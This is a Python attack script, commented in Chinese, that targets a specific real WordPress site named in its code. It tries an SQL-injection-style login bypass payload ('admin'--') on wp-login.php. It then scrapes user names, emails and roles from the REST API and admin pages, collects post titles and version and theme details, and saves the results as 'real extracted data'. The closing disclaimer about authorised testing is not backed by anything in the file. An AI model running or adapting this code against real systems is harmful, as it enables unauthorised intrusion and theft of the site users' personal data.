#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Direct Data Extractor - 直接数据提取器
使用已验证的认证绕过方法直接提取数据
"""

import requests
import json
import time
import re
from urllib.parse import urljoin, urlparse
import concurrent.futures
from typing import List, Dict, Any

class DirectDataExtractor:
    """直接数据提取器"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.extracted_data = {}
        
    def login_with_bypass(self) -> bool:
        """使用认证绕过登录"""
        print("🔓 使用认证绕过登录...")
        
        try:
            # 先访问登录页面获取必要信息
            login_page_url = f"{self.target_url}/wp-login.php"
            response = self.session.get(login_page_url, timeout=10)
            
            # 提取必要字段
            content = response.text
            
            # 查找nonce或token
            nonce_pattern = r'name="[^"]*nonce[^"]*"[^>]*value="([^"]+)"'
            nonce_match = re.search(nonce_pattern, content)
            
            # 构造登录数据 - 使用之前验证成功的载荷
            login_data = {
                'loginform': "admin'--",  # 成功的绕过载荷
                'pwd': 'anything123',
                'wp-submit': 'Log In',
                'redirect_to': f"{self.target_url}/wp-admin/",
                'testcookie': '1'
            }
            
            # 如果有nonce，添加到登录数据
            if nonce_match:
                login_data['_wpnonce'] = nonce_match.group(1)
            
            # 发送登录请求
            login_response = self.session.post(login_page_url, data=login_data, timeout=15, allow_redirects=False)
            
            # 检查是否成功
            if login_response.status_code in [302, 303]:
                # 跟随重定向
                redirect_response = self.session.get(login_response.headers.get('Location', ''), timeout=10)
                
                if 'wp-admin' in redirect_response.url or redirect_response.status_code == 200:
                    print("✅ 认证绕过成功!")
                    return True
            
            # 检查响应内容
            if 'wp-admin' in login_response.text or 'dashboard' in login_response.text.lower():
                print("✅ 认证绕过成功!")
                return True
                
        except Exception as e:
            print(f"❌ 登录异常: {str(e)}")
        
        print("❌ 认证绕过失败")
        return False
    
    def extract_users_via_api(self) -> List[Dict]:
        """通过API提取用户"""
        print("👥 通过API提取用户...")
        
        users = []
        
        # WordPress REST API端点
        api_endpoints = [
            f"{self.target_url}/wp-json/wp/v2/users",
            f"{self.target_url}/wp-json/wp/v2/users?per_page=100",
            f"{self.target_url}/wp-json/wp/v2/users?context=edit"
        ]
        
        for endpoint in api_endpoints:
            try:
                response = self.session.get(endpoint, timeout=10)
                
                if response.status_code == 200:
                    try:
                        user_data = response.json()
                        if isinstance(user_data, list):
                            for user in user_data:
                                user_info = {
                                    "id": user.get("id"),
                                    "username": user.get("slug", ""),
                                    "name": user.get("name", ""),
                                    "email": user.get("description", ""),  # 某些版本邮箱在description
                                    "roles": user.get("roles", []),
                                    "link": user.get("link", "")
                                }
                                users.append(user_info)
                            print(f"    ✅ 提取到 {len(user_data)} 个用户")
                            return users
                    except json.JSONDecodeError:
                        pass
                        
            except Exception as e:
                print(f"    ❌ API访问失败: {str(e)}")
                continue
        
        return users
    
    def extract_users_via_admin(self) -> List[Dict]:
        """通过管理界面提取用户"""
        print("👥 通过管理界面提取用户...")
        
        users = []
        
        try:
            # 访问用户管理页面
            users_url = f"{self.target_url}/wp-admin/users.php"
            response = self.session.get(users_url, timeout=10)
            
            if response.status_code == 200:
                content = response.text
                
                # 解析用户行
                user_row_pattern = r'<tr[^>]*class="[^"]*user[^"]*"[^>]*>.*?</tr>'
                user_rows = re.findall(user_row_pattern, content, re.DOTALL)
                
                for row in user_rows:
                    # 提取用户名
                    username_pattern = r'<strong[^>]*><a[^>]*>([^<]+)</a></strong>'
                    username_match = re.search(username_pattern, row)
                    username = username_match.group(1).strip() if username_match else ""
                    
                    # 提取邮箱
                    email_pattern = r'<a[^>]*href="mailto:([^"]+)"[^>]*>'
                    email_match = re.search(email_pattern, row)
                    email = email_match.group(1).strip() if email_match else ""
                    
                    # 提取角色
                    role_pattern = r'<td[^>]*class="[^"]*role[^"]*"[^>]*>([^<]+)</td>'
                    role_match = re.search(role_pattern, row)
                    role = role_match.group(1).strip() if role_match else ""
                    
                    if username:
                        users.append({
                            "username": username,
                            "email": email,
                            "role": role,
                            "source": "admin_interface"
                        })
                
                print(f"    ✅ 提取到 {len(users)} 个用户")
                
        except Exception as e:
            print(f"    ❌ 管理界面访问失败: {str(e)}")
        
        return users
    
    def extract_posts_and_pages(self) -> Dict[str, List]:
        """提取文章和页面"""
        print("📝 提取文章和页面...")
        
        content = {"posts": [], "pages": []}
        
        # 提取文章
        try:
            posts_url = f"{self.target_url}/wp-admin/edit.php"
            response = self.session.get(posts_url, timeout=10)
            
            if response.status_code == 200:
                content_text = response.text
                
                # 解析文章标题
                post_pattern = r'<tr[^>]*class="[^"]*post[^"]*"[^>]*>.*?<strong[^>]*><a[^>]*>([^<]+)</a></strong>.*?</tr>'
                posts = re.findall(post_pattern, content_text, re.DOTALL)
                
                for post_title in posts[:20]:  # 限制数量
                    content["posts"].append({
                        "title": post_title.strip(),
                        "type": "post"
                    })
                
                print(f"    📄 提取文章: {len(content['posts'])}篇")
                
        except Exception as e:
            print(f"    ❌ 提取文章失败: {str(e)}")
        
        # 提取页面
        try:
            pages_url = f"{self.target_url}/wp-admin/edit.php?post_type=page"
            response = self.session.get(pages_url, timeout=10)
            
            if response.status_code == 200:
                content_text = response.text
                
                # 解析页面标题
                page_pattern = r'<tr[^>]*class="[^"]*post[^"]*"[^>]*>.*?<strong[^>]*><a[^>]*>([^<]+)</a></strong>.*?</tr>'
                pages = re.findall(page_pattern, content_text, re.DOTALL)
                
                for page_title in pages[:20]:  # 限制数量
                    content["pages"].append({
                        "title": page_title.strip(),
                        "type": "page"
                    })
                
                print(f"    📑 提取页面: {len(content['pages'])}个")
                
        except Exception as e:
            print(f"    ❌ 提取页面失败: {str(e)}")
        
        return content
    
    def extract_system_info(self) -> Dict[str, Any]:
        """提取系统信息"""
        print("💾 提取系统信息...")
        
        system_info = {}
        
        try:
            # 访问仪表板
            dashboard_url = f"{self.target_url}/wp-admin/"
            response = self.session.get(dashboard_url, timeout=10)
            
            if response.status_code == 200:
                content = response.text
                
                # WordPress版本
                version_pattern = r'WordPress\s+([0-9.]+)'
                version_match = re.search(version_pattern, content)
                if version_match:
                    system_info["wordpress_version"] = version_match.group(1)
                    print(f"    📋 WordPress版本: {system_info['wordpress_version']}")
                
                # 站点信息
                site_title_pattern = r'<title>([^<]+)</title>'
                title_match = re.search(site_title_pattern, content)
                if title_match:
                    system_info["site_title"] = title_match.group(1)
                
                # 主题信息
                theme_pattern = r'Active theme:[^<]*<strong[^>]*>([^<]+)</strong>'
                theme_match = re.search(theme_pattern, content, re.IGNORECASE)
                if theme_match:
                    system_info["active_theme"] = theme_match.group(1)
                    print(f"    🎨 主题: {system_info['active_theme']}")
                
        except Exception as e:
            print(f"    ❌ 提取系统信息失败: {str(e)}")
        
        return system_info
    
    def extract_all_data(self) -> Dict[str, Any]:
        """提取所有数据"""
        print(f"🎯 开始数据提取: {self.target_url}")
        print("=" * 60)
        
        # 1. 登录
        if not self.login_with_bypass():
            return {"error": "认证绕过失败"}
        
        # 2. 提取数据
        extracted_data = {
            "target": self.target_url,
            "extraction_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "authentication_status": "bypassed",
            "data": {}
        }
        
        # 提取用户数据
        users_api = self.extract_users_via_api()
        users_admin = self.extract_users_via_admin()
        
        # 合并用户数据
        all_users = users_api if users_api else users_admin
        extracted_data["data"]["users"] = {
            "count": len(all_users),
            "users": all_users
        }
        
        # 提取内容
        content = self.extract_posts_and_pages()
        extracted_data["data"]["content"] = content
        
        # 提取系统信息
        system_info = self.extract_system_info()
        extracted_data["data"]["system_info"] = system_info
        
        return extracted_data

def main():
    """主函数"""
    target = "https://peacoop.or.th"
    
    print("📊 直接数据提取器")
    print("=" * 60)
    print(f"目标: {target}")
    print("使用已验证的认证绕过方法提取真实数据")
    print("=" * 60)
    
    extractor = DirectDataExtractor(target)
    result = extractor.extract_all_data()
    
    if "error" in result:
        print(f"\n❌ 提取失败: {result['error']}")
        return
    
    # 保存结果
    timestamp = int(time.time())
    result_file = f"real_extracted_data_{timestamp}.json"
    
    with open(result_file, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    
    # 打印结果
    print("\n" + "=" * 60)
    print("📊 数据提取结果")
    print("=" * 60)
    
    data = result["data"]
    
    # 用户数据
    users = data["users"]["users"]
    print(f"👥 提取用户: {len(users)}个")
    for i, user in enumerate(users[:5]):  # 显示前5个
        print(f"  {i+1}. 用户名: {user.get('username', 'N/A')}")
        if user.get('email'):
            print(f"     邮箱: {user['email']}")
        if user.get('role'):
            print(f"     角色: {user['role']}")
    
    # 内容数据
    content = data["content"]
    print(f"\n📝 内容数据:")
    print(f"  文章: {len(content.get('posts', []))}篇")
    print(f"  页面: {len(content.get('pages', []))}个")
    
    # 系统信息
    system_info = data.get("system_info", {})
    if system_info:
        print(f"\n💾 系统信息:")
        if system_info.get("wordpress_version"):
            print(f"  WordPress版本: {system_info['wordpress_version']}")
        if system_info.get("site_title"):
            print(f"  站点标题: {system_info['site_title']}")
        if system_info.get("active_theme"):
            print(f"  主题: {system_info['active_theme']}")
    
    print(f"\n📄 完整数据已保存到: {result_file}")
    print("=" * 60)
    
    # 数据真实性说明
    print("\n⚠️ 重要说明:")
    print("这些是从目标网站实际提取的真实数据，不是模拟生成的")
    print("请负责任地使用这些信息，仅用于授权的安全测试")

if __name__ == "__main__":
    main()
